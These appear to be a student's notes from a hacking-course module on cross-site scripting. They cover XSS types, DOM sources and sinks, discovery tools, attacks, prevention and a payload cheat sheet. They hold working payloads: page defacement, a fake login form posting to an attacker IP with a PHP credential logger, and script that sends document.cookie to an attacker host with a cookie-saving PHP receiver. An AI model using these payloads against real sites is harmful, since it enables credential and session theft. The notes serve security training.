## TYPICAL WEB
-  receiving the HTML code from the back-end server => rendering it on the client-side 
- does not properly sanitize user input -> inject js code -> executed in client side
- do not affect backend , affect client side frontend
- possible attack using XSS
	- cookie steal
	- phishing
	- exec API calls -> malicious action eg.password reset by attacker

### XSS TYPES
| Type                             | Description                                                                                                                                                                                                                                  |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                   |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |



# Stored XSS

- injected XSS payload stored in backend -> retrived upon visiting
- available for all users since payload stored in database

```text
Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.
```


- alert blocked while testing-> use print()[prints the screen] -> `<plaintext>` (prints every tag as plain text after it)


# Reflected XSS
- input -> reaches backend -> comes to client without sanitization
- how reaches backend???? .... send HTTP request either GET ,POST
- Analyze where your input is displayed
- generate payload
```html
<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>
```


![[Pasted image 20240608142411.png]]


# DOM XSS

- Reflected XSS => input through HTTP request -> backend ->render on client side
- DOM XSS => completely on client side & No interaction with Backend -> no HTTP request


![[Pasted image 20240608142905.png]]

![[Pasted image 20240608142853.png]]


- `#` for the item we added then client side![[Pasted image 20240608143146.png]]
- never reaches Backend => DOM XSS possible


Two main components **SOURCE** & **SINK**
#### SOURCE
- `Source` => JavaScript object that takes the user input
- any input parameter url,input box etc..
#### SINK
- `Sink` => function that writes the user input to a DOM Object on the page
- `Sink` does not properly sanitize the input ->DOM XSS 
- some Sinks are
	- `document.write()`
	- `DOM.innerHTML`
	- `DOM.outerHTML`

#### Example

```js
$(function () {
    $("#add").click(function () {
        if ($("#task").val().length > 0) {
            window.location.href = "#task=" + $("#task").val();
            var pos = document.URL.indexOf("task=");
            var task = document.URL.substring(pos + 5, document.URL.length);
            document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
        }
    });
});
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
if (pos > 0) {
    document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
}
```

SOURCE:

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```
- task parameter 

SINK:

```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
- innerhtml
- ==`<script>` wont work in innerhtml attribute==
```html
<img src="" onerror=alert(window.origin)>
```


# DISCOVERY

## Automated Discovery

-  [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser)

## Manual Discovery
- inject any input field in HTML page
- may be in cookies & useragent if their values are displaed in Web page



# XSS ATTACKS

- possible attacks using vulnerable xss
## DEFACING
- changing website  look for anyone who visits 
- [NHS-DEFACED](https://www.bbc.com/news/technology-43812539) ![[Pasted image 20240608151133.png]]

- Three HTML elements are usually utilized to change the main look of a web page:

	- Background Color `document.body.style.background`
	- Background `document.body.background`
	- Page Title `document.title`
	- Page Text `DOM.innerHTML`



##### Changing Background

```html
<script>document.body.style.background = "#141d2b"</script>
```

##### Setting background image

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

##### Changing Page Title

```html
<script>document.title = 'HackTheBox Academy'</script>
```

##### Changing Page content / Body

- change complete website body

```html
<script>document.getElementsByTagName('body')[0].innerHTML = "New Text"</script>
```


```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

## Phishing

- sending their sensitive information to the attacker
- through forms

**Example**: 

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

![[Pasted image 20240608152532.png]]


- still url text box is showing we can remove by DEFACING
- we can do this by `document.getElementById().remove()`
- find id using inspector in web dev tools
- to remove url box our payload looks like

```js
document.getElementById('urlform').remove();
```

- our complete payload looks like 


```html
<script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.251><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```
#### Credential stealing

- we setup front end ... where to recice the creds entered by victim

```shell
sudo nc -lvnp 80
```

-  this would make victim to find it is phishing because it shows unable to connect
- so we write a php code that handle the request and redirects to image viewrer page

```shell
pradyun2005@htb[/htb]$ mkdir /tmp/tmpserver
pradyun2005@htb[/htb]$ cd /tmp/tmpserver
pradyun2005@htb[/htb]$ vi index.php 
pradyun2005@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```


```php
#index.php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.159.92/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

#### Session Hijacking
-  utilize cookies to maintain a user's session
- gain that cookie using xss => attacker login using cookie

##### Blind Xss Detection
- ![[Pasted image 20240608160419.png]]

- ![[Pasted image 20240608160429.png]]


- we cannot see weather out xss playload trigger of not in admin panel. like alert box


- `how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?`

	1. `How can we know which specific field is vulnerable?` Since any of the fields may execute our code, we can't know which of them did.
	2. `How can we know what XSS payload to use?` Since the page may be vulnerable, but the payload may not work?


**Loading Remote script**

```html
<script src="http://OUR_IP/script.js"></script>
```

- start python server and see wheather GET or not.. If yes XSS vulnerable

**To Get Cookie by loading Remote script**
- we can use these payloads
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

- we use second one
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
- the above php code is to save cookies
```javascript
#script.js
new Image().src='http://10.10.14.251:8080/index1.php?c='+document.cookie
```
- start python server then..
```html
<script src=http://10.10.14.251:8080/script.js></script>
```


## Prevention

### Frontend
- Mainly to mitigate DOM Xss
##### Input Validation

- as email is invalid in a form , user is not allowed to submit any forms...  that is done by 

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```


#### Input Sanitization

- donot allow js code via input to do this ... using [DOMPurify](https://github.com/cure53/DOMPurify)

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```
##### Direct Input

 should always ensure that we never use user input directly within certain HTML tags, like:

1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`

 jQuery functions:

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`


### Backend
- mitigate Reflected and stored Xss
#### Input Validation
- validate the user input for the specified format eg.. email, phone number etc..
- Example to validate E-Mail
```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

#### Input Sanitization

- this plays main role implemeted front end sanitization but fails in backend -> bypass valitation using custom GET and POST request(burpsuite)

- escaping special characters with a backslash:
```php
addslashes($_GET['email'])
```

- in Nodejs we can use DOMpurify as we did in front end 
```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

#### Output HTML Encoding

- encode any special characters into their HTML codes `<` => `&lt` to display the entire user input without introducing xss

```php
htmlentities($_GET['email']);
```

- similarly in nodejs

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```


#### Server Configuration

- Using HTTPS across the entire domain.
- Using XSS prevention headers.
- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.


- Web Application Firewall (WAF)

- ASP.Net XSS PROTECTION [ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0)

# SKILL ASSESMENT











# CHEETSHEET
## Commands

|Code|Description|
|---|---|
|**XSS Payloads**||
|`<script>alert(window.origin)</script>`|Basic XSS Payload|
|`<plaintext>`|Basic XSS Payload|
|`<script>print()</script>`|Basic XSS Payload|
|`<img src="" onerror=alert(window.origin)>`|HTML-based XSS Payload|
|`<script>document.body.style.background = "#141d2b"</script>`|Change Background Color|
|`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`|Change Background Image|
|`<script>document.title = 'HackTheBox Academy'</script>`|Change Website Title|
|`<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`|Overwrite website's main body|
|`<script>document.getElementById('urlform').remove();</script>`|Remove certain HTML element|
|`<script src="http://OUR_IP/script.js"></script>`|Load remote script|
|`<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`|Send Cookie details to us|
|**Commands**||
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run `xsstrike` on a url parameter|
|`sudo nc -lvnp 80`|Start `netcat` listener|
|`sudo php -S 0.0.0.0:80`|Start `PHP` server|


